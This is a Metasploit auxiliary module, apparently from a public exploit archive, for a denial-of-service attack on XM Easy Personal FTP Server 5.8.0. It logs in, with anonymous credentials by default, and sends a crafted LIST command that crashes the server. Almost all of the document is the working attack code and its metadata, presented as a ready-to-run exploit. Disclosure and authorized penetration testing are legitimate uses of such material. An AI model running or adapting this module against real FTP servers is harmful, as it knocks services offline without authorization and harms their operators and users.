# Exploit Title: XM Easy Personal FTP Server LIST DoS (Meta)
# Date: 4/17/2010
# Author: Jeremiah Talamantes
# Software Link: http://www.dxm2008.com/data/ftpserversetup.exe
# Version: 5.8.0
# Tested on: Windows XP, SP2
# CVE : N/A
# Code : http://www.redteamsecure.com/assets/company/exploits/xmftp/xmexploit.p

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/ 
##

##
# xmeasy580_list.rb
#
# XM Easy Personal FTP Server 5.8.0 LIST DoS
#
# Tested on: Windows XP, SP2 (EN)
#
# Date tested: 4/17/2010
#
# First you must login to the FTP server in order to execute the DoS
# attack. This module exploits a weakness in the LIST command.
#
# Discovered by: Jeremiah Talamantes
# RedTeam Security
# http://www.redteamsecure.com
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Ftp
	include Msf::Auxiliary::Dos
	
	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'XM Easy Personal FTP Server 5.8.0 LIST DoS',
			'Description'    => %q{
				This module exploits a DoS vulnerability in the LIST command
				in XM Easy Personal FTP Server 5.8.0. In order to execute this
				exploit, you must first login to the FTP server. This was only
				tested on Windows XP, SP2 (EN).
			},
			'Author'         => 'Jeremiah Talamantes (RedTeam Security)',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 1234 $',
			'References'     => [
				[ 'URL', 'None' ]
			],
			'DisclosureDate' => 'Apr 17 2010')
		)

		# Required settings
		register_options([
			OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
			OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ])
		])
	end

	def run
		return unless connect_login

		raw_send("LIST \r\n")
		
		disconnect

		print_status("Check to see if the server is responding...")
	end
end
